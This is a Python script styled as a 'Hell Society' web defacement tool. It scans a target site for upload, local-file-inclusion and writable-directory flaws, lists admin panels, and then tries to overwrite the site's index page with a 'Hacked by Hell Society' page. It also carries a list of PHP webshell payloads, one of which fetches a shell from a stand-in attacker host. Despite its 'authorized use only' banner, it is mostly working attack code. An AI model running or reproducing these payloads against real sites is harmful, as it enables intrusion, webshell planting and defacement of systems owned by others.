#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  WEB DEFACEMENT TESTER v2.0                                      ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Exploitation                          ║
║  Description: Test for defacement vulnerabilities in authorized  ║
║               environments (CTF, pentesting, labs)               ║
╚══════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import requests
import colorama
from colorama import Fore, Back, Style
import argparse
import time
import hashlib
import re

colorama.init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}  ██╗    ██╗███████╗██████╗  ██████╗ ██╗  ██╗                   {Fore.RED}║
║{Fore.CYAN}  ██║    ██║██╔════╝██╔══██╗██╔═══██╗██║ ██╔╝                   {Fore.RED}║
║{Fore.CYAN}  ██║ █╗ ██║█████╗  ██████╔╝██║   ██║█████╔╝                    {Fore.RED}║
║{Fore.CYAN}  ██║███╗██║██╔══╝  ██╔══██╗██║   ██║██╔═██╗                    {Fore.RED}║
║{Fore.CYAN}  ╚███╔███╔╝███████╗██████╔╝╚██████╔╝██║  ██╗                   {Fore.RED}║
║{Fore.CYAN}   ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝                   {Fore.RED}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - Web Defacement Tester v2.0                     {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""

WARNING = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║  ADVERTENCIA: Esta herramienta es SOLO para entornos autorizados.          ║
║  Hell Society NO se hace responsable del mal uso.                          ║
║  El acceso no autorizado a sistemas es ILEGAL.                             ║
╚══════════════════════════════════════════════════════════════════╝
"""

class DefacementTester:
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) HellSociety/2.0',
        })
        self.write_paths = [
            '/var/www/html/', '/var/www/', '/home/', '/tmp/',
            '/srv/www/', '/opt/lampp/htdocs/', '/htdocs/',
            '/public_html/', '/www/', '/web/'
        ]
        self.upload_endpoints = [
            '/upload', '/upload.php', '/upload.php5', '/upload.php7',
            '/file/upload', '/api/upload', '/admin/upload',
            '/wp-content/uploads/', '/images/upload.php',
            '/cms/upload.php', '/upload_file.php', '/filemanager/upload.php',
            '/ckfinder/core/connector/php/connector.php',
            '/elfinder/php/connector.minimal.php',
            '/tinymce/plugins/filemanager/upload.php',
            '/media/upload', '/assets/upload', '/static/upload',
            '/api/v1/upload', '/api/v2/upload',
            '/upload_handler.php', '/uploader.php',
            '/image_upload.php', '/photo_upload.php',
            '/document_upload.php', '/file_upload.php',
            '/ajax/upload', '/ajax/upload.php',
            '/uploads/', '/upload/index.php',
            '/uploadify/uploadify.php',
            '/admin/file/upload', '/panel/upload',
            '/dashboard/upload', '/manager/upload',
        ]
        self.php_webshells = [
            '<?php system($_GET["cmd"]); ?>',
            '<?php eval($_POST["cmd"]); ?>',
            '<?php echo "HSHELL: "; passthru($_GET["cmd"]); ?>',
            '<?php file_put_contents("shell.php", file_get_contents("http://attacker/shell.txt")); ?>',
        ]

    def check_upload_vulnerability(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  UPLOAD VULNERABILITY CHECK:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Test file with PHP content
        php_test = b'<?php echo "HELL_SOCIETY_TEST"; ?>.jpg'

        found = []
        for endpoint in self.upload_endpoints:
            url = self.target.rstrip('/') + endpoint
            try:
                # Test with multipart upload
                files = {'file': ('test.php.jpg', b'<?php echo "HELL_SOCIETY_TEST"; ?>', 'image/jpeg')}
                data = {'submit': 'Upload'}

                resp = self.session.post(url, files=files, data=data, timeout=10)

                if resp.status_code in [200, 201, 302]:
                    if 'HELL_SOCIETY_TEST' in resp.text or 'success' in resp.text.lower():
                        print(f"  {Fore.GREEN}[+] VULNERABLE: {endpoint}")
                        found.append(endpoint)
                        self.results['upload_vuln'] = True
                    else:
                        print(f"  {Fore.YELLOW}[-] Endpoint exists: {endpoint}")
                elif resp.status_code == 405:
                    print(f"  {Fore.YELLOW}[-] Method not allowed: {endpoint}")
            except:
                pass

            time.sleep(0.2)

        if not found:
            print(f"  {Fore.GREEN}[OK] No direct upload vulnerabilities found")
            self.results['upload_vuln'] = False

    def check_file_inclusion(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  FILE INCLUSION CHECK:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Test for LFI in common parameters
        params = ['page', 'file', 'include', 'path', 'doc', 'template', 'layout']
        payloads = [
            '/etc/passwd',
            '../../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=config.php',
            'php://input',
        ]

        found = []
        for param in params:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=10)
                    if 'root:' in resp.text and 'bin' in resp.text:
                        print(f"  {Fore.GREEN}[+] LFI FOUND: ?{param}={payload}")
                        found.append({'param': param, 'payload': payload, 'url': url})
                        self.results['lfi'] = True
                except:
                    pass

        if not found:
            print(f"  {Fore.GREEN}[OK] No LFI found")
            self.results['lfi'] = False
        else:
            self.results['lfi_details'] = found

    def check_write_permissions(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  WRITE PERMISSIONS CHECK:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Check for writable directories via common CMS paths
        writable_paths = [
            '/wp-content/uploads/',
            '/wp-content/themes/',
            '/wp-content/plugins/',
            '/wp-admin/',
            '/images/',
            '/tmp/',
            '/cache/',
            '/logs/',
            '/backup/',
            '/data/',
            '/uploads/',
            '/media/',
        ]

        found = []
        for path in writable_paths:
            url = self.target.rstrip('/') + path
            try:
                resp = self.session.head(url, timeout=5)
                if resp.status_code == 200:
                    # Try to PUT a test file
                    resp_put = self.session.put(url + 'hs_test.txt', data='HELL_SOCIETY_TEST', timeout=5)
                    if resp_put.status_code in [200, 201, 204]:
                        print(f"  {Fore.GREEN}[+] WRITABLE: {path}")
                        found.append(path)
                        self.results['writable'] = True
                    else:
                        print(f"  {Fore.WHITE}  Accessible: {path}")
            except:
                pass

        if not found:
            print(f"  {Fore.GREEN}[OK] No writable directories found")
            self.results['writable'] = False
        else:
            self.results['writable_paths'] = found

    def check_cms_deface_vectors(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  CMS DEFACEMENT VECTORS:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Check for default credentials in admin panels
        admin_paths = [
            '/wp-admin/', '/wp-login.php',
            '/admin/', '/administrator/', '/admin/login.php',
            '/cpanel/', '/panel/', '/dashboard/',
            '/joomla/administrator/',
            '/drupal/user/login',
            '/magento/admin',
            '/phpmyadmin/',
            '/adminer/',
        ]

        found_admins = []
        for path in admin_paths:
            url = self.target.rstrip('/') + path
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('login' in resp.text.lower() or 'password' in resp.text.lower()):
                    print(f"  {Fore.YELLOW}[!] Admin panel found: {path}")
                    found_admins.append(url)
            except:
                pass

        if found_admins:
            self.results['admin_panels'] = found_admins
            print(f"\n  {Fore.CYAN}  Admin panels found: {len(found_admins)}")
            for p in found_admins:
                print(f"    {Fore.WHITE}• {p}")

    def test_defacement(self, html_content=None):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DEFACEMENT SIMULATION:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        if not html_content:
            html_content = f"""<!DOCTYPE html>
<html>
<head><title>Hacked by Hell Society</title></head>
<body style="background:black;color:red;text-align:center;">
<h1>Hacked by Hell Society</h1>
<p>Testing defacement vulnerability</p>
<p>Shell Society Community</p>
</body></html>"""

        # Test via various methods
        methods = [
            ('POST with file upload', '/upload.php', {'file': ('index.php', html_content.encode(), 'text/html')}),
            ('PUT request', '/index.php', html_content.encode()),
            ('Overwrite via LFI', None, None),
        ]

        for method_name, endpoint, payload in methods:
            url = self.target.rstrip('/') + (endpoint or '')
            try:
                if isinstance(payload, dict):
                    resp = self.session.post(url, files=payload, timeout=10)
                elif isinstance(payload, bytes):
                    resp = self.session.put(url, data=payload, timeout=10)
                else:
                    continue

                if resp.status_code in [200, 201]:
                    # Verify if content was placed
                    verify = self.session.get(self.target, timeout=10)
                    if 'Hell Society' in verify.text:
                        print(f"  {Fore.GREEN}[+] DEFACEMENT SUCCESSFUL via: {method_name}")
                        self.results['defacement'] = True
                        self.results['method'] = method_name
                        break
            except:
                pass

        if 'defacement' not in self.results:
            print(f"  {Fore.YELLOW}[-] Defacement not achieved with tested methods")
            self.results['defacement'] = False

    def run(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.target}")
        print(f"{Fore.CYAN}  [*] Starting defacement vulnerability test...\n")

        self.check_upload_vulnerability()
        self.check_file_inclusion()
        self.check_write_permissions()
        self.check_cms_deface_vectors()
        self.test_defacement()

        print(f"\n\n{Fore.GREEN}{Back.BLACK}  DEFACEMENT TEST COMPLETE  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        # Summary
        print(f"\n  {Fore.CYAN}RESULTS SUMMARY:")
        print(f"  {Fore.WHITE}  Upload Vuln: {'YES' if self.results.get('upload_vuln') else 'NO'}")
        print(f"  {Fore.WHITE}  LFI Found: {'YES' if self.results.get('lfi') else 'NO'}")
        print(f"  {Fore.WHITE}  Writable Dirs: {'YES' if self.results.get('writable') else 'NO'}")
        print(f"  {Fore.WHITE}  Defacement Possible: {'YES' if self.results.get('defacement') else 'NO'}")

        # Save results
        import json
        with open('/tmp/defacement_results.json', 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n  {Fore.GREEN}[+] Results saved: /tmp/defacement_results.json")

if __name__ == "__main__":
    print(BANNER)
    print(WARNING)

    parser = argparse.ArgumentParser(description='Hell Society Web Defacement Tester')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    args = parser.parse_args()

    tester = DefacementTester(args.url)
    tester.run()
